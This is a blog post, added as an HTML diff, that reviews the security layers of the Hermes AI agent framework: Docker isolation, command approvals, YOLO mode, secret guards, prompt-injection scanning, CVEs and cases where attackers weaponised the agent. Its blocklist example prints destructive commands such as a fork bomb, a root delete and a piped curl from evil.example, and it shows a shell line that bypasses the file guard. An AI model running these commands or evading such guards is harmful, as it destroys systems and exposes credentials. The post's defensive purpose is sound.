+    <p>Most agent frameworks market their security pages as a fortress of many strong walls. <a href="https://github.com/NousResearch/hermes-agent/security">Hermes's SECURITY.md</a> opens from the opposite direction: it names <strong>OS-level isolation</strong> as the <em>only</em> true security boundary against adversarial LLM behavior. Approvals, denylists, and scanners are explicitly framed as damage-reduction tools — useful, layered, and ultimately bypassable.</p>
+
+    <blockquote>💡 Paraphrasing the SECURITY.md position: if the model genuinely decides to act against you, the only thing that stops it is a boundary the operating system enforces — not a prompt, not a filter. That assumption is the spine of this entire article.</blockquote>
+
+    <p>Why does this matter so much? Because the primary threat to an agent is not an external hacker breaking into the process. It is the <strong>model itself being fed poisoned input</strong> — from a web page it reads, a file in your project, a message in a chat. When the dangerous command originates inside the agent's own reasoning, every mechanism that relies on the model's judgment fails simultaneously. What remains is whatever the kernel enforces.</p>
+
+    <p>The disclosure process is simple: report privately through GitHub Security Advisories or security@nousresearch.com, with a 90-day disclosure window and <strong>no bug bounty</strong>. One oddity I verified myself and find genuinely strange: at the time of writing, the repository's own Security Advisories tab shows <em>zero</em> published advisories, even though NVD lists a number of real hermes-agent CVEs (we will get to them below). CVEs are flowing through NVD without ever appearing on the repo's advisory page — which means an administrator who only watches the repository can miss vulnerability news entirely.</p>
+
+    <h2 id="en-backends">Terminal Backends and Docker Hardening</h2>
+
+    <p>The isolation layer starts with a single question: where do the agent's shell commands actually run? The README names seven backends — local, Docker, SSH, Singularity, Modal, Daytona, and Vercel Sandbox — and their security behavior differs sharply:</p>
+
+    <div class="table-wrapper">
+        <table>
+            <thead>
+                <tr>
+                    <th>Backend</th>
+                    <th>Where commands execute</th>
+                    <th>Dangerous-command checks</th>
+                </tr>
+            </thead>
+            <tbody>
+                <tr>
+                    <td><strong>local</strong></td>
+                    <td>Directly on the host, with your user's privileges</td>
+                    <td>On</td>
+                </tr>
+                <tr>
+                    <td><strong>ssh</strong></td>
+                    <td>A remote machine over SSH</td>
+                    <td>On</td>
+                </tr>
+                <tr>
+                    <td><strong>docker / singularity</strong></td>
+                    <td>A container on your machine</td>
+                    <td>Off — the container is the boundary</td>
+                </tr>
+                <tr>
+                    <td><strong>modal / daytona / vercel_sandbox</strong></td>
+                    <td>A provider-hosted cloud sandbox</td>
+                    <td>Off — the sandbox is the boundary</td>
+                </tr>
+            </tbody>
+        </table>
+    </div>
+
+    <p>Notice how consistent this is with the opening premise: inside container backends, the docs say Hermes <em>skips</em> its dangerous-command checks entirely, because the container is already the real boundary. Command filtering only earns its keep when commands run on a bare host. The configuration:</p>
+
+    <pre><code># ~/.hermes/config.yaml
+terminal:
+  backend: docker          # local | docker | ssh | singularity | modal | daytona | vercel_sandbox
+  container_cpu: 1         # default: 1 vCPU
+  container_memory: 5120   # default: 5120 MB
+  container_disk: 51200    # default: 51200 MB</code></pre>
+
+    <p>And when you pick Docker, Hermes does not run a naked container. Its defaults are stricter than what many DevOps teams configure by hand — equivalent to running with this flag set:</p>
+
+    <pre><code># What Hermes's default Docker hardening amounts to
+docker run \
+  --cap-drop ALL \                       # drop every Linux capability first
+  --cap-add DAC_OVERRIDE \               # then add back exactly three
+  --cap-add CHOWN \
+  --cap-add FOWNER \
+  --security-opt no-new-privileges \     # no privilege escalation via setuid
+  --pids-limit 256 \                     # fork bombs die at the kernel
+  --tmpfs /tmp:nosuid,noexec ...         # /tmp is writable but not executable</code></pre>
+
+    <p><code>--cap-drop ALL</code> followed by three selective adds is the textbook least-privilege posture, and details like <code>--pids-limit 256</code> and a <code>noexec</code> tmpfs tell you the designers have personally met fork bombs and payloads staged in /tmp. For any organization, I consider <code>terminal.backend: docker</code> the minimum acceptable line — the local backend belongs on a disposable experiment laptop and nowhere else.</p>
+
+    <h2 id="en-approvals">Approvals, YOLO Mode, and the Hardline Blocklist</h2>
+
+    <p>The next layer is command approval. The default <code>approvals.mode</code> is <strong>smart</strong>: an auxiliary LLM triages each command's risk — low-risk commands auto-approve, uncertain ones escalate to a human. The alternatives are <code>manual</code> (ask about everything) and <code>off</code>. What I genuinely applaud is that every headless context — cron jobs, one-shot queries, unattended sessions — defaults to <strong>deny</strong>, and if no human answers within 300 seconds, the command is refused:</p>
+
+    <pre><code># ~/.hermes/config.yaml
+approvals:
+  mode: smart              # smart | manual | off
+  cron_mode: deny          # nobody is watching a cron job → deny
+  single_query_mode: deny  # one-shot queries → deny
+  unattended_mode: deny    # unattended sessions → deny
+  timeout: 300             # seconds of silence = refusal
+  deny:                    # your own fnmatch rules — these survive YOLO
+    - "aws iam *"
+    - "kubectl delete *"
+    - "* --force"</code></pre>
+
+    <p>Then there is the switch this whole series keeps circling back to: <strong>YOLO mode</strong>. It can be enabled three ways — the <code>--yolo</code> flag, the <code>/yolo</code> slash command, or <code>HERMES_YOLO_MODE=1</code> — and it bypasses the entire approval system. Exactly two things survive it: your own <code>approvals.deny</code> rules, and the <strong>hardline blocklist</strong> baked into the code:</p>
+
+    <pre><code># Commands the hardline blocklist refuses even under YOLO
+rm -rf /                          # recursive root delete
+:(){ :|:&amp; };:                     # fork bomb
+mkfs.ext4 /dev/sda1               # mkfs on a mounted device
+curl http://evil.example/a.sh | sh  # piping an untrusted URL into a shell</code></pre>
+
+    <div class="alert danger">
+        <strong>The warning belongs right here:</strong> YOLO mode is designed for sandboxes you can afford to lose. Never enable it on a machine holding real credentials — the incidents section below covers what happened when someone left it running unattended inside a Thai government network.
+    </div>
+
+    <p>My view of this layer: smart approvals are excellent UX for daily work, but never forget that the risk assessor is itself an LLM — which, by definition, can also be deceived. It is high-quality damage reduction. It is not a boundary, exactly as SECURITY.md warned.</p>
+
+    <h2 id="en-secrets">Secrets and File-Write Guards — and Their Admitted Limits</h2>
+
+    <p>Hermes hard-blocks its <code>write_file</code>/<code>patch</code> tools from touching credential stores — both the operating system's and its own:</p>
+
+    <pre><code># Paths the file-write guard always refuses
+~/.ssh/          ~/.aws/          ~/.kube/
+/etc/sudoers     ~/.netrc
+~/.hermes/auth.json               # Hermes's own credentials
+.env and .env.*                   # anywhere in a project
+mcp-tokens/      pairing/
+
+# Optionally jail all writes under approved prefixes
+export HERMES_WRITE_SAFE_ROOT="/home/anirach/projects"</code></pre>
+
+    <p>But the most valuable line on the <a href="https://hermes-agent.nousresearch.com/docs/user-guide/security/">security docs page</a> is the concession that follows: the docs state outright that the terminal tool can still bypass these guards — file guards &ldquo;reduce accidental damage and signal to the model,&rdquo; they are &ldquo;not a hostile-agent sandbox.&rdquo; In plain terms, <code>echo x &gt;&gt; ~/.ssh/config</code> through a shell still works if that shell runs on the host. Which brings us straight back to the premise: if you want a real wall, use a container.</p>
+
+    <p>On the secrets side, three mechanisms work quietly at all times:</p>
+
+    <ul>
+        <li><strong>Env filtering</strong> — environment variables whose names match KEY / TOKEN / SECRET / PASSWORD / CREDENTIAL / PASSWD / AUTH patterns are stripped from every child process by default</li>
+        <li><strong>MCP minimal env</strong> — stdio MCP subprocesses receive an allowlist only: PATH, HOME, USER, LANG, LC_ALL, TERM, SHELL, TMPDIR, and the XDG_* family</li>
+        <li><strong>Redaction</strong> — error messages scrub GitHub PATs (<code>ghp_...</code>), <code>sk-...</code> keys, bearer tokens, and key=/password= parameters into <code>[REDACTED]</code></li>
+    </ul>
+
+    <p>A skill that genuinely needs a secret can request scoped passthrough rather than reopening the whole environment:</p>
+
+    <pre><code># In a skill's manifest — request only what you need
+required_environment_variables:
+  - GITHUB_TOKEN</code></pre>
+
+    <p>This layer is still actively moving: release <a href="https://github.com/NousResearch/hermes-agent/releases">v0.21.0 (August 31, 2026)</a> lists a &ldquo;deep redaction sweep&rdquo; closing secret-leak gaps in terminal errors, env-file reads, checkpoints, and logs, plus mandatory write-approval for protected agent-instruction files. That tells us two things at once: the team keeps investing here — and gaps of exactly this kind really existed, or there would have been nothing to sweep.</p>
+
+    <h2 id="en-injection">Prompt Injection, Tirith, and SSRF Defense</h2>
+
+    <p>The third layer confronts poisoned input — in my assessment the most dangerous threat class for any agent that reads the web and your files on its own. Hermes scans context files (AGENTS.md, .cursorrules, SOUL.md) <em>before</em> they enter the prompt: looking for override instructions, suspicious hidden HTML comments, credential-read attempts, curl-based exfiltration patterns, and <strong>invisible Unicode</strong> — zero-width characters and bidi overrides, the favorite tricks for hiding payloads in files that look perfectly innocent to a human reviewer. Caught content is replaced with a <code>[BLOCKED: ...]</code> marker so you can see, after the fact, that something was filtered.</p>
+
+    <p>Before any command executes, there is also <strong>Tirith</strong> — a pre-exec scanner enabled by default (<code>security.tirith_enabled: true</code>) that detects homograph URLs, pipe-to-interpreter patterns, and terminal injection. It is auto-installed with SHA-256 verification, runs under a 5-second timeout, and operates <strong>fail-open</strong>: if the scanner breaks, the command proceeds. The <strong>SSRF</strong> defense is its polar opposite — always on and <strong>fail-closed</strong> for every URL-capable tool. It blocks RFC-1918 ranges, loopback, link-local addresses (including <code>169.254.169.254</code>, the classic doorway for stealing cloud credentials), CGNAT 100.64.0.0/10, and metadata hostnames, and it re-validates redirects at every hop.</p>
+
+    <div class="alert info">
+        <strong>The pair of terms to take from this section:</strong> fail-open = when it breaks, traffic flows (Tirith — chooses smoothness). Fail-closed = when it breaks, the door shuts (SSRF, the dashboard — chooses safety). Whenever you read any tool's security docs, look for these two words first: they tell you who carries the risk when the system fails.
+    </div>
+
+    <pre><code># ~/.hermes/config.yaml
+security:
+  tirith_enabled: true        # default — fail-open, 5s timeout
+  allow_private_urls: false   # default — the fail-closed SSRF guard
+  website_blocklist:          # your own additions, applied across web/browser tools
+    - "*.pastebin.com"</code></pre>
+
+    <p>This section has to close on one irony, though. NVD confirms CVE-2026-10223 (Medium, CVSS 6.3): Hermes's own memory-content scanner (<code>_scan_memory_content</code>) was itself an injection vector in versions 2026.4.0–2026.4.30, with a public exploit disclosed (SentinelOne classifies it more severely, as RCE). <strong>The scanner is one more piece of attack surface.</strong> Every layer you add is more code that can break. That is not an argument for removing scanners — it is one more good argument for why none of these layers can be counted as the boundary.</p>
+
+    <hr>
+
+    <h2 id="en-channels">Who Gets to Talk to It: Default-Deny and DM Pairing</h2>
+
+    <p>The most painful lesson of the OpenClaw era was the gateway that talked to anyone who messaged it. Hermes answers with <strong>default-deny</strong> authorization, evaluated in a strict six-step order — and if no step matches, the answer is no:</p>
+
+    <ol>
+        <li>The per-platform allow-all flag (if you deliberately set one)</li>
+        <li>The <strong>DM pairing</strong> approved list</li>
+        <li>Per-platform allowlists, e.g. <code>TELEGRAM_ALLOWED_USERS</code></li>
+        <li>The global <code>GATEWAY_ALLOWED_USERS</code></li>
+        <li><code>GATEWAY_ALLOW_ALL_USERS</code> (the switch the official checklist says never to enable in production)</li>
+        <li>Nothing matched → <strong>deny</strong></li>
+    </ol>
+
+    <p>The DM pairing system is designed by people who have clearly been brute-forced before: 8-character cryptographically random codes, a 1-hour TTL, at most 3 pending requests per platform, 1 request per user per 10 minutes, a 1-hour lockout after 5 failed attempts, and pairing state stored at chmod 0600:</p>
+
+    <pre><code># Managing pairing from the CLI
+hermes pairing list                # pending requests and the approved list
+hermes pairing approve &lt;code&gt;      # approve with the 8-char code the user sent
+hermes pairing revoke &lt;user&gt;       # revoke access when someone leaves the team</code></pre>
+
+    <p>The <strong>web dashboard</strong> follows the same philosophy. By default it binds only to <code>127.0.0.1:9119</code>, and if you try to bind it to a public interface without configuring an auth provider, it <strong>refuses to start</strong> — fail-closed. Three auth options exist: scrypt-hashed username/password, OAuth through Nous Portal (the documented recommendation for anything internet-facing), or self-hosted OIDC such as Keycloak or Authentik. Around that sit 15-minute access tokens, a 10-per-minute-per-IP login rate limit, audit logging of auth events, and <code>dashboard.trusted_proxies</code> paired with <code>HERMES_DASHBOARD_PUBLIC_URL</code> to defeat DNS rebinding behind reverse proxies. This entire design supersedes the early criticism that the dashboard shipped without authentication — that claim is simply no longer true.</p>
+
+    <pre><code># ~/.hermes/config.yaml — dashboard sketch
+dashboard:
+  # default bind: 127.0.0.1:9119 — loopback only
+  # a non-loopback bind requires a configured auth provider (fail-closed)
+  trusted_proxies:
+    - 10.0.0.5              # your trusted reverse proxy
+# pair with HERMES_DASHBOARD_PUBLIC_URL when running behind a proxy</code></pre>
+
+    <h2 id="en-cves">The CVE Record: What the First Six Months Broke</h2>
+
+    <p>Early-year comparison posts loved to note that Hermes had &ldquo;no CVEs at all&rdquo; against OpenClaw's notorious tally. I will not reprint the OpenClaw-side numbers here, because third-party sources contradict each other by multiples (I reconciled that mess in my OpenClaw Security post). The more important point: the &ldquo;zero CVE&rdquo; framing died over the summer. It only ever reflected the fact that nobody was looking yet. Once Hermes crossed into hundred-thousand-star territory, the researchers arrived, and the CVEs followed — mostly filed against April 2026 builds:</p>
+
+    <div class="table-wrapper">
+        <table>
+            <thead>
+                <tr>
+                    <th>CVE</th>
+                    <th>Class</th>
+                    <th>Affected</th>
+                    <th>Status</th>
+                </tr>
+            </thead>
+            <tbody>
+                <tr>
+                    <td><strong>CVE-2026-53869</strong></td>
+                    <td>DNS rebinding on WebSocket endpoints — CVSS 8.7 (High)</td>
+                    <td>Below 0.16.0</td>
+                    <td>Fixed in 0.16.0 — published Jun 17, 2026</td>
+                </tr>
+                <tr>
+                    <td><strong>CVE-2026-11461</strong></td>
+                    <td>Cross-session authorization bypass via resolve_session_by_title</td>
+                    <td>Up to 0.12.0</td>
+                    <td>Fixed (per SentinelOne)</td>
+                </tr>
+                <tr>
+                    <td><strong>CVE-2026-9368</strong></td>
+                    <td>Sandbox issue in execute_code</td>
+                    <td>Builds to 2026.4.16</td>
+                    <td>Fixed</td>
+                </tr>
+                <tr>
+                    <td><strong>CVE-2026-10548</strong></td>
+                    <td>Credential handling in the credential pool</td>
+                    <td>Builds to 2026.4.23</td>
+                    <td>Fixed</td>
+                </tr>
+                <tr>
+                    <td><strong>CVE-2026-53870</strong></td>
+                    <td>State files created world-readable (0o644)</td>
+                    <td>April 2026 builds</td>
+                    <td>Fixed</td>
+                </tr>
+                <tr>
+                    <td><strong>CVE-2026-10223</strong></td>
+                    <td>Injection/RCE in the memory scanner itself (per SentinelOne)</td>
+                    <td>Builds to 2026.4.30</td>
+                    <td>Fixed</td>
+                </tr>
+            </tbody>
+        </table>
+    </div>
+
+    <p>The one worth studying in detail is <strong>CVE-2026-53869</strong>: the WebSocket endpoints (<code>/api/pty</code>, <code>/api/ws</code>, <code>/api/pub</code>, <code>/api/events</code>) were vulnerable to DNS rebinding because FastAPI's HTTP middleware <em>does not run for WebSocket upgrades</em> — so the Host/Origin validation protecting the normal HTTP paths was silently skipped. A malicious page in your browser could rebind DNS to localhost and connect straight into the agent's pty. It is the same bug class that has bitten developer tools for years: the defense exists, but it does not cover every door.</p>
+
+    <p>On the overall count: Kodem Security's CVE archive collects around ten hermes-agent entries as of early September 2026 (for an exact figure, derive it from NVD yourself — aggregator lists have gaps). The Cloud Security Alliance published a research note on May 4, 2026, under a deliberately pointed title — <em>&ldquo;9 CVEs in 4 Days: What Hermes Agent Enterprises Must Learn&rdquo;</em> — whose body counts 3 formally disclosed CVEs plus 13 additional critical/high findings from an April audit (the 9 in the title includes a later reservation batch). The CSA's conclusion matches my own: the real risk is <strong>architectural</strong>. Persistent memory plus broad tool access plus rich credentials is the same attack-surface class as OpenClaw, no matter how clean the code is on any given day.</p>
+
+    <div class="alert">
+        <strong>Still open at the time of writing (Sep 1, 2026):</strong> <a href="https://github.com/NousResearch/hermes-agent/issues/4281">GitHub issue #4281</a> (open since March 31, 2026, tagged P2, with no visible maintainer response) documents that messaging-gateway sessions using <code>terminal.backend: local</code> execute on the host with the user's full privileges — and that the <code>execute_code</code> tool bypasses the approval system entirely. This is the single biggest reason I insist that production means the docker backend, full stop.
+    </div>
+
+    <h2 id="en-incidents">Incidents in the Wild: When YOLO Became an Attacker Feature</h2>
+
+    <p>What stands out in Hermes's real-world incident record is that every case is about <strong>misuse and misconfiguration</strong>, not exploitation of Hermes itself — and the first one happened in my own country.</p>
+
+    <p>As reported by The Hacker News (July 2026), researchers at Hunt.io working with Bob Diachenko discovered a threat actor running Hermes <strong>unattended, in YOLO mode</strong>, as a post-exploitation agent inside the network of <strong>Thailand's Ministry of Finance</strong> — using it to run LinPEAS privilege reconnaissance, browse personnel records dating back to 2012, and explore a Hadoop cluster left on default authentication. The almost-comic irony is how it came to light: the operator had left their own <code>/hermes-results/</code> directory exposed on the internet, so the researchers could read the agent's entire working log. Thailand's national CERT was notified on July 15, 2026. The report found no confirmed exfiltration, and stated explicitly that this was <strong>not a flaw in Hermes</strong> — a legitimate tool had been weaponized using a switch it ships with.</p>
+
+    <p>As a Thai academic who runs an agent deployment daily, this lands on me twice. Once because it happened to our own government. And once, more deeply, because every property that makes Hermes a good assistant — running continuously without supervision, wielding broad tools, deciding for itself — is precisely the property set an attacker wants. <strong>The YOLO switch we enable for convenience is, unmodified, the attacker's automation feature.</strong></p>
+
+    <p>Two weeks later, Palo Alto Networks Unit42 (July 31, 2026) documented a more systematic case: an actor pairing DeepSeek as the reasoning engine with Hermes as the operational harness, autonomously scanning and exploiting internet-facing Citrix NetScaler, Langflow, and n8n servers in cycles that required no per-action approval — with confirmed data theft. The background noise is not quiet either: Hunt.io data reported by Penligent counted roughly 5,900 probes for the HermesWebUI server header over a month, and 575 exposed <code>/hermes-results/</code> directories as of July 23, 2026 — meaning someone is scanning for misconfigured Hermes instances around the clock. As of this writing, I have found no direct first-party response from Nous Research to either incident.</p>
+
+    <h2 id="en-checklist">A Hardening Checklist for Organizations — and the Gaps That Remain</h2>
+
+    <p>The official docs close with a production checklist of about ten points, which I will reorder into the sequence I would actually execute:</p>
+
+    <ol>
+        <li>Use explicit user allowlists — <strong>never</strong> set <code>GATEWAY_ALLOW_ALL_USERS=true</code></li>
+        <li><code>terminal.backend: docker</code> with resource limits — the heart of this whole article</li>
+        <li>Keep secrets in <code>~/.hermes/.env</code> at <code>chmod 600</code></li>
+        <li>Use DM pairing instead of hardcoding user IDs</li>
+        <li>Run Hermes as an ordinary user, never root</li>
+        <li>Re-audit your <code>command_allowlist</code> periodically</li>
+        <li>Watch <code>~/.hermes/logs/</code> routinely</li>
+        <li>Stay current — every CVE in the table above is fixed in recent releases</li>
+        <li>The strongest posture: split machines — run the gateway on one host and point <code>terminal.backend: ssh</code> at a separate execution host, so messaging and execution never share a machine</li>
+    </ol>
+
+    <pre><code># The production config.yaml I use as a starting point
+terminal:
+  backend: docker
+  container_cpu: 1
+  container_memory: 5120
+approvals:
+  mode: smart
+  unattended_mode: deny
+  deny:
+    - "aws iam *"
+    - "* --force"
+security:
+  tirith_enabled: true
+  allow_private_urls: false</code></pre>
+
+    <pre><code># The admin's weekly routine
+hermes doctor                      # supply-chain advisories — this is what flagged
+                                   # the May 2026 mistralai 2.4.6 poisoning at startup
+hermes skills audit                # re-scan installed skills
+tail -f ~/.hermes/logs/gateway.log # checklist item 7, in practice</code></pre>
+
+    <p>The skills supply chain carries armor that answers the old marketplace scandals directly: every third-party skill undergoes mandatory install-time scanning (for exfiltration, injection directives, and destructive commands), trust tiers run from builtin/official down to community, and a &ldquo;dangerous&rdquo; verdict is <strong>non-overridable</strong> — even with <code>--force</code>. Skills the agent writes for itself during a session pass through the <code>skills.write_approval</code> gate for human diff review, and v0.21.0 extended security scanning to plugin installs as well. I will go deep on all of this in post #6, Skills.</p>
+
+    <p>So what does Hermes still <em>not</em> have? LensHQ's enterprise gap analysis (August 13, 2026) lists them plainly: no native SSO/RBAC, no centralized tamper-proof audit trail, no default-deny egress, no credential rotation. Their recommendations: microVM isolation instead of shared-kernel containers, and forcing all egress through a proxy allowlist so that prompt-injection exfiltration both <em>fails and gets logged</em>. I agree with nearly all of it, with one fairness note: that critique is accurate for the self-hosted OSS. Nous itself has begun selling the organizational side through <strong>Hermes Cloud</strong> (public preview since roughly July 2026), which advertises granular access controls and unified billing via Nous Portal — a different path from self-hosting, and one I will examine in #7, Production.</p>
+
+    <blockquote>💡 Repello AI compressed the persistent-agent threat model into the sentence I would put on the cover of this entire topic: &ldquo;you cannot patch your way to a secure persistent agent.&rdquo; Vulnerabilities get fixed one at a time; the architecture of the risk remains — as long as the agent remembers, acts, and holds keys.</blockquote>
+
+    <p>My conclusion for any organization weighing Hermes: the layers it ships are genuinely better than today's industry baseline, and they improve with every release. But trust the first sentence of SECURITY.md more than every feature combined. Plan on the assumption that approvals and scanners will eventually miss — and let containers, segmented networks, and an egress proxy be what catches the day they do.</p>
+
+    <div class="key-takeaways">
+        <h3>🎯 Key Takeaways</h3>
+        <ul>
+            <li><strong>OS-level isolation</strong> = the only boundary SECURITY.md itself calls real — approvals, denylists, and scanners are all damage reduction</li>
+            <li><strong>terminal.backend: docker</strong> = the production minimum — with strong defaults already (cap-drop ALL, no-new-privileges, pids-limit 256, noexec tmpfs)</li>
+            <li><strong>YOLO mode</strong> = bypasses all approvals except the hardline blocklist — and has already served as an attacker's automation feature in the Thai Ministry of Finance incident</li>
+            <li><strong>File-write guards</strong> = protection against accidents, not hostile agents — the docs admit the terminal can route around them</li>
+            <li><strong>Fail-open vs fail-closed</strong> = Tirith lets traffic through when it breaks; SSRF and the dashboard shut the door — find these two words first in any security doc</li>
+            <li><strong>Default-deny + DM pairing</strong> = the direct answer to the OpenClaw era's open-gateway lesson</li>
+            <li><strong>The CVE record</strong> = the &ldquo;zero CVE&rdquo; framing is dead — a CVSS 8.7 DNS-rebinding High was fixed in 0.16.0, and issue #4281 (execute_code bypassing approvals on the local backend) remains open</li>
+            <li><strong>The org checklist</strong> = explicit allowlists, docker backend, chmod 600, non-root, split gateway/execution hosts — and add your own egress proxy, because default-deny egress is a gap Hermes has not closed</li>
+        </ul>
+    </div>
+
+    </div>
+
+    <div class="post-series-footer">
+      <span class="l-th">บทความจากซีรีส์ Hermes Agent in Practice 2026</span><span class="l-en" lang="en">From the Hermes Agent in Practice 2026 series</span>
+    </div>
+
+  </article>
+
+  </main>
+
+  <footer class="blog-footer">
+    <nav class="blog-footer__nav" aria-label="Site">
+      <a href="../index.html">Home</a>
+      <a href="./">Blog</a>
+      <a href="../publications/">Publications</a>
+      <a href="../books/">Books</a>
+      <a href="../projects/">Projects</a>
+      <a href="../news/">News</a>
+      <a href="../index.html#contact">Contact</a>
+    </nav>
+    <a href="./">← Back to Blog</a>
+    <span>© 2026 Anirach Mingkhwan — Associate Professor, KMUTNB</span>
+  </footer>
+
+</body>
+</html>
